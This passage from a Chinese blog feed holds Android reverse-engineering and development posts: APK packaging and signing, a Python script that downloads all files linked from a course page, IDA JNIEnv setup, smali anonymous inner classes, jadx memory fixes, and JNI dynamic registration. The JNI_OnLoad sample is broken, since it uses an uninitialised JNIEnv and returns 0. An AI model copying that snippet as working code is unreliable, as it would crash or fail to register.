title="apkbuilder"></a>apkbuilder</h2><p>第6步：apkbuilder<br>打包生成APK文件。旧的apkbuilder脚本已经废弃，现在都已经通过sdklib.jar的ApkBuilder类进行打包了。输入为我们之前生成的包含resources.arcs的.ap<em>文件，上一步生成的dex文件，以及其他资源如jni、.so文件。<br>大致步骤为<br>以包含resources.arcs的.ap</em>文件为基础，new一个ApkBuilder，设置debugMode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apkBuilder.addZipFile(f);</span><br><span class="line">apkBuilder.addSourceFolder(f);</span><br><span class="line">apkBuilder.addResourcesFromJar(f);</span><br><span class="line">apkBuilder.addNativeLibraries(nativeFileList);</span><br><span class="line">apkBuilder.sealApk(); // 关闭apk文件</span><br><span class="line">generateDependencyFile(depFile, inputPaths, outputFile.getAbsolutePath());</span><br></pre></td></tr></table></figure></p><h2 id="对APK签名"><a href="#对APK签名" class="headerlink" title="对APK签名"></a>对APK签名</h2><p>第7步：对APK签名<br>对APK文件进行签名。Android系统在安装APK的时候，首先会检验APK的签名，如果发现签名文件不存在或者校验签名失败，则会拒绝安装，所以应用程序在发布之前一定要进行签名。签名信息中包含有开发者信息，在一定程度上可以防止应用被伪造。对一个APK文件签名之后，APK文件根目录下会增加META-INF目录，该目录下增加三个文件：</p><ul><li>MANIFEST.MF</li><li>NETEASE.RSA</li><li>NETEASE.SF<br>Android系统就是根据这三个文件的内容对APK文件进行签名检验的。签名过程主要利用apksign.jar或者jarsinger.jar两个工具。将根据我们提供的Debug和Release两个版本的Keystore进行相应的签名。</li></ul><h2 id="zipalign优化"><a href="#zipalign优化" class="headerlink" title="zipalign优化"></a>zipalign优化</h2><p>第8步：zipalign优化<br>Zipalign是一个Android平台上整理APK文件的工具，它首次被引入是在Android 1.6版本的SDK软件开发工具包中。它能够对打包的Android应用程序进行优化， 以使Android操作系统与应用程序之间的交互作用更有效率，这能够让应用程序和整个系统运行得更快。用Zipalign处理过的应用程序执行时间达到最低限度，当设备运行APK应用程序时占更少的RAM。<br><strong>Zipalign如何进行优化的呢？</strong><br>调用buildtoolszipalign，对签名后的APK文件进行对齐处理，使APK中所有资源文件距离文件起始偏移为4字节的整数倍，从而在通过内存映射访问APK文件时会更快。同时也减少了在设备上运行时的内存消耗。<br>最终这样我们的APK就生成完毕了。</p><h2 id="典型的APK中内容"><a href="#典型的APK中内容" class="headerlink" title="典型的APK中内容"></a>典型的APK中内容</h2><ul><li>AndroidManifest.xml 程序全局配置文件</li><li>classes.dex Dalvik字节码</li><li>resources.arsc 资源索引表</li><li>META-INF该目录下存放的是签名信息</li><li>res 该目录存放资源文件</li><li>assets该目录可以存放一些配置或资源文件</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>res/values/public.xml：<a href="https://codeday.me/bug/20170816/57361.html" target="_blank" rel="noopener">https://codeday.me/bug/20170816/57361.html</a><br>Android代码混淆之ProGuard<br><a href="http://rensanning.iteye.com/blog/2224635" target="_blank" rel="noopener">http://rensanning.iteye.com/blog/2224635</a><br>Android资源管理框架（Asset Manager）简要介绍和学习计划<br><a href="http://blog.csdn.net/luoshengyang/article/details/8738877" target="_blank" rel="noopener">http://blog.csdn.net/luoshengyang/article/details/8738877</a><br>Android应用程序资源的编译和打包过程分析<br><a href="http://blog.csdn.net/luoshengyang/article/details/8744683" target="_blank" rel="noopener">http://blog.csdn.net/luoshengyang/article/details/8744683</a></p>]]></content>
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>python爬虫爬取网页上的所有文件</title>
      <link href="/2018/02/08/crawel/"/>
      <url>/2018/02/08/crawel/</url>
      <content type="html"><![CDATA[<p>今天AI让我把一个课程的slides都下载一下，就写了一个爬取页面所有链接的脚本。</p><h2 id="单线程爬虫"><a href="#单线程爬虫" class="headerlink" title="单线程爬虫"></a>单线程爬虫</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取网页内容</span></span><br><span class="line">r = requests.get(<span class="string">'http://www.cs.cmu.edu/afs/cs/academic/class/15745-s06/web/schedule.html'</span>)</span><br><span class="line">data = r.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用正则查找所有链接</span></span><br><span class="line">link_list =re.findall(<span class="string">r"(?&lt;=href=\").+?(?=\")|(?&lt;=href=\').+?(?=\')"</span> ,data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存成文件</span></span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> link_list:</span><br><span class="line">    <span class="keyword">print</span> url</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="comment"># print url.split('/')[-1]</span></span><br><span class="line">    <span class="keyword">with</span> open(url.split(<span class="string">'/'</span>)[<span class="number">-1</span>], <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(r.content)</span><br></pre></td></tr></table></figure><h2 id="多线程爬虫"><a href="#多线程爬虫" class="headerlink" title="多线程爬虫"></a>多线程爬虫</h2><p>思路：先通过爬虫查找到所有链接，然后放进队列里下载。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading, Queue</span><br><span class="line"></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_queue</span><span class="params">(list)</span>:</span></span><br><span class="line">    link_queue = Queue.Queue()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> list:</span><br><span class="line">        link_queue.put(p)</span><br><span class="line">    <span class="keyword">return</span> link_queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetPdf</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span><span class="params">(self, link)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> lock</span><br><span class="line">        <span class="keyword">print</span> link</span><br><span class="line">        r = requests.get(link)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            lock.acquire()</span><br><span class="line">            <span class="comment"># print url.split('/')[-1]</span></span><br><span class="line">            <span class="keyword">with</span> open(link.split(<span class="string">'/'</span>)[<span class="number">-1</span>], <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(r.content)</span><br><span class="line">            lock.release()</span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Error: 读取文件失败"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetPdfMulti</span><span class="params">(GetPdf)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, link_queue)</span>:</span></span><br><span class="line">        GetPdf.__init__(self)</span><br><span class="line">        self.link_queue = link_queue</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> link_queue.empty():</span><br><span class="line">            link = self.link_queue.get()</span><br><span class="line">            self.get_pdf(link)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'__main__'</span> == __name__:</span><br><span class="line">    <span class="comment"># 获取网页内容</span></span><br><span class="line">    r = requests.get(<span class="string">'http://www.cs.cmu.edu/afs/cs/academic/class/15745-s06/web/schedule.html'</span>)</span><br><span class="line">    data = r.text</span><br><span class="line">    thread_num = <span class="number">20</span></span><br><span class="line">    <span class="comment"># 利用正则查找所有链接</span></span><br><span class="line">    link_list = re.findall(<span class="string">r"(?&lt;=href=\").+?(?=\")|(?&lt;=href=\').+?(?=\')"</span>, data)</span><br><span class="line">    link_queue = get_queue(link_list)</span><br><span class="line">    ThreadList = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, thread_num):</span><br><span class="line">        t = GetPdfMulti(link_queue)</span><br><span class="line">        ThreadList.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"done"</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>IDA 导入JNIEnv</title>
      <link href="/2018/02/08/jnienv/"/>
      <url>/2018/02/08/jnienv/</url>
      <content type="html"><![CDATA[<h2 id="local-type"><a href="#local-type" class="headerlink" title="local type"></a>local type</h2><p>shift+F1打开local type<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo96bavidhj30kk0iaq5g.jpg" alt=""><br>现在的内容是这样的<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo96bsjkzcj30od0aa75u.jpg" alt=""><br>然后shift+F9,按下insert<br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo96crhcpfj30cn081dga.jpg" alt=""><br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo96dfiyvlj30g509lwgg.jpg" alt=""><br>都导入进去了<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo96dnjtdfj30wd0maafb.jpg" alt=""></p><h2 id="指定函数类型"><a href="#指定函数类型" class="headerlink" title="指定函数类型"></a>指定函数类型</h2><p>剩下的就是手动指定函数类型即可~<br>按下y，输入JNIEnv即可。<br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo96e17kfuj30s80crtaq.jpg" alt=""></p><h2 id="JNIEnv的函数调用对照表"><a href="#JNIEnv的函数调用对照表" class="headerlink" title="JNIEnv的函数调用对照表"></a>JNIEnv的函数调用对照表</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/android%E9%80%86%E5%90%91/JNI_ENV_FUNCTIONS.xls" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/android%E9%80%86%E5%90%91/JNI_ENV_FUNCTIONS.xls</a></p>]]></content>
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android逆向基础 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MainActivity$1.smali和匿名内部类</title>
      <link href="/2018/02/08/niming/"/>
      <url>/2018/02/08/niming/</url>
      <content type="html"><![CDATA[<h2 id="MainActivity-1-smali"><a href="#MainActivity-1-smali" class="headerlink" title="MainActivity$1.smali"></a>MainActivity$1.smali</h2><p>在android逆向中我们经常遇到xxx.smali和xxx$1.smali这种一起出现，这是什么意思呢？<br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo8h8p471kj30jc0giaap.jpg" alt=""><br>我用jadx反编译并导出gradle工程看看。<br><code>jadx -e AliCrackme_2.apk</code>，得到文件如下，观察MainActivity.java<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo8hefe1dfj31kw0qpna2.jpg" alt=""><br>用apktools反编译并用jd-gui打开<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo8hfx3ttij313q0ro0um.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo8hitia92j31cq0zmq5s.jpg" alt=""></p><p>这样一对比就很清楚了，反编译出来的MainActivity$1，实际上是MainActivity的匿名内部类。</p><h2 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>定义一个匿名内部类：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Out</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object obj = <span class="keyword">new</span> Object() &#123;</span><br><span class="line">        <span class="keyword">private</span> String name = <span class="string">"匿名内部类"</span>;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Object obj = <span class="keyword">new</span> Object() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(b);</span><br><span class="line">                <span class="keyword">return</span> String.valueOf(a);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        System.out.println(obj.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>匿名内部类可以出现在任何允许表达式出现的地方，定义格式：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> 类/接口&#123; </span><br><span class="line">  <span class="comment">//匿名内部类实现部分</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p>Out.java编译后匿名内部类会生成相应的class文件<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Out</span>$1 </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    Out$<span class="number">1</span>(Out var1) &#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0</span> = var1;</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="string">"匿名内部类"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>匿名内部类可以访问外部类所有的变量和方法。</p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>匿名内部类使用广泛，比如我们常用的绑定监听的时候。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">view.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    Toast.makeText(v.getContext(),<span class="string">"click"</span>,Toast.LENGTH_SHORT).show();    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>所以逆向的时候不必过于关注xxx$数字这样的文件。</p>]]></content>
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>解决jadx的反编译卡顿和inconsistent code</title>
      <link href="/2018/02/08/jadx/"/>
      <url>/2018/02/08/jadx/</url>
      <content type="html"><![CDATA[<h2 id="jadx介绍"><a href="#jadx介绍" class="headerlink" title="jadx介绍"></a>jadx介绍</h2><p>jadx 的功能非常的强大,它可以处理大部分反编译的需求。<br>jadx 优点：</p><ul><li>图形化的界面。</li><li>拖拽式的操作。</li><li>反编译输出 Java 代码。</li><li>导出 Gradle 工程。</li><li>反混淆</li></ul><h2 id="安装-jadx"><a href="#安装-jadx" class="headerlink" title="安装 jadx"></a>安装 jadx</h2><p>Jadx Github ：<br><a href="https://github.com/skylot/jadx" target="_blank" rel="noopener">https://github.com/skylot/jadx</a><br>直接下载最新版就可以了，现在的最新版是 jadx-0.6.1 。下载好解压之后，你会获得这样的目录结构：<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo8gnvuaz4j312c0gw78y.jpg" alt=""></p><h2 id="inconsistent-code"><a href="#inconsistent-code" class="headerlink" title="inconsistent code"></a>inconsistent code</h2><p>有时候有代码，反编译的不完整，你会看到 JADX WARNING : inconsistent code 标志的错误。<br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo8gs9rv39j30m80hi410.jpg" alt=""><br>这一段代码，就已经不是 Java 的代码了，不利于我们的阅读。而 jadx 为了应对这样的情况，可以尝试开启 Show inconsistent code 开关。你可以在 File -&gt; Preferences 中找到它。<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo8gsp3ovxj30e50kcq7i.jpg" alt=""><br>开启 inconsistent code 之后，我们再来看看这段代码，就感觉亲切了。<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo8gt1cio6j30m80jk42c.jpg" alt=""><br>这样处理的代码，大部分为伪代码，可能会有错误的地方，具体问题具体分析吧。</p><h2 id="反编译错误或者卡顿"><a href="#反编译错误或者卡顿" class="headerlink" title="反编译错误或者卡顿"></a>反编译错误或者卡顿</h2><p>jadx 反编译一些小的 Apk，一点压力都没有，但是对于一些比较重的 Apk，一般 Apk 大于 50MB 的，你都可能遇到使用 jadx 反编译的时候卡死的问题。<br>如果你看了 terminal 中 Log 输出，你应该可以发现，实际上它是因为 OOM 引起的。<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo8gtnai2fj30m80l5aha.jpg" alt=""><br>官方对于这样因为内存不足引发的问题，也提供了一些解决方案。</p><h3 id="1、减少处理的线程数。"><a href="#1、减少处理的线程数。" class="headerlink" title="1、减少处理的线程数。"></a>1、减少处理的线程数。</h3><p>jadx 为了加快编译的效率，所以是使用多线程处理的，而多个线程会耗费跟多的内存。所以减小反编译时候的线程数，是一个有效的方法。</p><p>如果使用命令行的话，可以使用 -j 1 参数，配置线程数为 1，不配置的话，默认线程数为 4。</p><p>而使用 jadx-gui 的话，可以在 Preferences 中，通过配置 Processing threads count 来配置线程数。</p><h3 id="2、修改-jadx-脚本"><a href="#2、修改-jadx-脚本" class="headerlink" title="2、修改 jadx 脚本"></a>2、修改 jadx 脚本</h3><p>直接编辑 ./bin 目录下的 jadx 脚本，配置找到 DEFAULT_JVM_OPTS ，将它设置为 DEFAULT_JVM_OPTS=”-Xmx2500M” ，就可以配置当前使用的内存大小。（例如微信，我设置为5个G才跑完，不过貌似跑出来的结果不完整，不过总算是不会崩溃了）</p><h3 id="3、使用命令行命令"><a href="#3、使用命令行命令" class="headerlink" title="3、使用命令行命令"></a>3、使用命令行命令</h3><p>如果以上方式都不好用，在没有更好的办法的情况下，你可以直接使用命令行，通过 jadx 的命令进行放编译。并将线程数配置为 1 ，这样虽然慢一些，但是多数情况下，是可以正常输出反编译后的代码的。</p><p>举个例子：</p><p><code>jadx -d out -j 1 classes.dex</code><br><code>jadx -e -j 1 input.apk</code><br>更多命令，可以通过 jadx -h 命令进行查看。<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo8gv9mh4jj30m80cxwh8.jpg" alt=""></p>]]></content>
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android逆向基础 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>native 方法的动态注册</title>
      <link href="/2018/02/08/jni2/"/>
      <url>/2018/02/08/jni2/</url>
      <content type="html"><![CDATA[<h2 id="动态注册的原理"><a href="#动态注册的原理" class="headerlink" title="动态注册的原理"></a>动态注册的原理</h2><p>JNI 允许我们提供一个函数映射表，注册给 JVM，这样 JVM 就可以用函数映射表来调用相应的函数，而不必通过函数名来查找相关函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// java 代码中的函数是 dynamicRegFromJni，调用的 native 方法是 nativeDynamicRegFromJni，该方法没有参数， 返回值是一个字符串。</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> jstring <span class="title">nativeDynamicRegFromJni</span><span class="params">(JNIEnv *env, jobject obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (*env) -&gt; NewStringUTF(env, <span class="string">"动态注册调用成功"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//函数映射表</span></span><br><span class="line">JNINativeMethod nativeMethod[] = &#123;&#123;<span class="string">"dynamicRegFromJni"</span>, <span class="string">"()Ljava/lang/String;"</span>, (<span class="keyword">void</span>*)nativeDynamicRegFromJni&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jint JNICALL <span class="title">JNI_OnLoad</span><span class="params">(JavaVM *jvm, <span class="keyword">void</span> *reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    JNIEnv *env;</span><br><span class="line">    </span><br><span class="line">    jclass clz = (*env) -&gt; FindClass(env, <span class="string">"com/sakura/hellojni/MainActivity"</span>);</span><br><span class="line"></span><br><span class="line">    (*env) -&gt; RegisterNatives(env, clz, nativeMethod, <span class="keyword">sizeof</span>(nativeMethod) / <span class="keyword">sizeof</span>(nativeMethod[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="函数映射表"><a href="#函数映射表" class="headerlink" title="函数映射表"></a>函数映射表</h2><h3 id="JNINativeMethod"><a href="#JNINativeMethod" class="headerlink" title="JNINativeMethod"></a>JNINativeMethod</h3><p>这是一个结构体，在 jni.h 头文件中定义：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* name;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* signature;</span><br><span class="line">    <span class="keyword">void</span>* fnPtr;</span><br><span class="line">&#125; JNINativeMethod;</span><br></pre></td></tr></table></figure></p><p>Java 与 jni 通过该结构体建立联系，其中有三个变量：</p><ul><li>name：Java 中函数的名字。</li><li>signature：签名符号，描述了函数的参数和返回值</li><li>fnPtr：函数指针，指向一个被调用的函数</li></ul><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>例如<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JNINativeMethod nativeMethod[] = &#123;&#123;<span class="string">"dynamicRegFromJni"</span>, <span class="string">"()Ljava/lang/String;"</span>, (<span class="keyword">void</span>*)nativeDynamicRegFromJni&#125;&#125;;</span><br></pre></td></tr></table></figure></p><p>可以看出，里面有一个成员，该成员第一个参数 “dynamicRegFromJni”,java 函数名；第二个参数“()Ljava/lang/String:”,是签名符号，意思是该函数没有参数，返回一个字符串 ；第三个参数就是要调用的 native 方法。<br>其他例子：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * JNI registration.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> JNINativeMethod gMethods[] = &#123;</span><br><span class="line">    <span class="comment">/* name, signature, funcPtr */</span></span><br><span class="line">    &#123; <span class="string">"isLoggable"</span>,      <span class="string">"(Ljava/lang/String;I)Z"</span>, (<span class="keyword">void</span>*) android_util_Log_isLoggable &#125;,</span><br><span class="line">    &#123; <span class="string">"println_native"</span>,  <span class="string">"(IILjava/lang/String;Ljava/lang/String;)I"</span>, (<span class="keyword">void</span>*) android_util_Log_println_native &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h2 id="JNI-OnLoad-函数"><a href="#JNI-OnLoad-函数" class="headerlink" title="JNI_OnLoad()函数"></a>JNI_OnLoad()函数</h2><p>当 java 通过 System.loadLibrary 加载完 JNI 动态库后，紧接着会调用 JNI_OnLoad 的函数。</p><h2 id="RegisterNatives"><a href="#RegisterNatives" class="headerlink" title="RegisterNatives"></a>RegisterNatives</h2><p>动态注册的工作就是在这里完成的。<br>RegisterNatives在 jni.h 中是这么定义的：</p><h3 id="c"><a href="#c" class="headerlink" title="c++"></a>c++</h3><p><code>jint RegisterNatives(jclass clazz, const JNINativeMethod* methods,jint nMethods)</code><br>该函数有三个参数：<br>clazz: java 类名，通过 FindClass 得到<br>methods: JNINativeMethod 结构体指针<br>nMethods: 方法个数</p><p>调用：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(*env) -&gt; RegisterNatives(env, clz, nativeMethod, <span class="keyword">sizeof</span>(nativeMethod) / <span class="keyword">sizeof</span>(nativeMethod[<span class="number">0</span>]));</span><br></pre></td></tr></table></figure></p><h3 id="c-1"><a href="#c-1" class="headerlink" title="c"></a>c</h3><p><code>jint (*RegisterNatives)(JNIEnv*, jclass, const JNINativeMethod*,jint);</code><br>该函数有四个参数：<br><code>JNIEnv*</code>: env<br>clazz: java 类名，通过 FindClass 得到<br>methods: JNINativeMethod 结构体指针<br>nMethods: 方法个数</p><p>调用：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span 